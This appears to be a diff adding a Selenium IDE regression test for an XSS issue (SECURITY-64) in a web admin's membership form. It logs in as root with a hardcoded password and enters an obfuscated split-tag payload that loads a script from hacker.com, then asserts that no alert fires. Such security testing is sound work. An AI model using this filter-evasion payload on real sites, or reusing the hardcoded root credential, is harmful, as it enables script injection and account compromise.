@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head profile="http://selenium-ide.openqa.org/profiles/test-case">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<link rel="selenium.base" href="http://localhost:8080/" />
+<title>XSS_REG_2</title>
+</head>
+<body>
+<table cellpadding="1" cellspacing="1" border="1">
+<thead>
+<tr><td rowspan="1" colspan="3">XSS_REG_2</td></tr>
+</thead><tbody>
+<tr>
+	<td>echo</td>
+	<td>==Login==</td>
+	<td></td></tr>
+<tr>
+	<td>include</td>
+	<td>COMM_login.html</td>
+	<td>UserName=root,UserPassword=gtngtn</td>
+</tr>
+<tr>
+	<td>echo</td>
+	<td>== XSS_REG_2 ==</td>
+	<td></td></tr>
+<tr>
+	<td>waitForElementPresent</td>
+	<td>link=Administration</td>
+	<td></td></tr>
+<tr>
+	<td>click</td>
+	<td>link=Administration</td>
+	<td></td></tr>
+<tr>
+	<td>waitForElementPresent</td>
+	<td>link=Groups and Roles</td>
+	<td></td></tr>
+<tr>
+	<td>clickAndWait</td>
+	<td>link=Groups and Roles</td>
+	<td></td></tr>
+<tr>
+	<td>waitForElementPresent</td>
+	<td>link=Membership Management</td>
+	<td></td></tr>
+<tr>
+	<td>click</td>
+	<td>link=Membership Management</td>
+	<td></td></tr>
+<tr>
+	<td>type</td>
+	<td>id=name</td>
+	<td>REG_9002</td>
+</tr>
+<!--Insert mal-script according to issue: SECURITY-64-->
+<tr>
+	<td>type</td>
+	<td>id=description</td>
+	<td>&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://hacker.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;</td>
+</tr>
+<tr>
+	<td>click</td>
+	<td>css=button.btn</td>
+	<td></td></tr>
+<!--Confirm result according to issue: SECURITY-64-->
+<tr>
+	<td>assertAlertNotPresent</td>
+	<td>XSS</td>
+	<td></td></tr>
+<tr>
+	<td>echo</td>
+	<td>==Logout==</td>
+	<td></td></tr>
+<tr>
+	<td>include</td>
+	<td>COMM_logout.html</td>
+	<td></td></tr>
+
+</tbody></table>
+</body>
+</html>
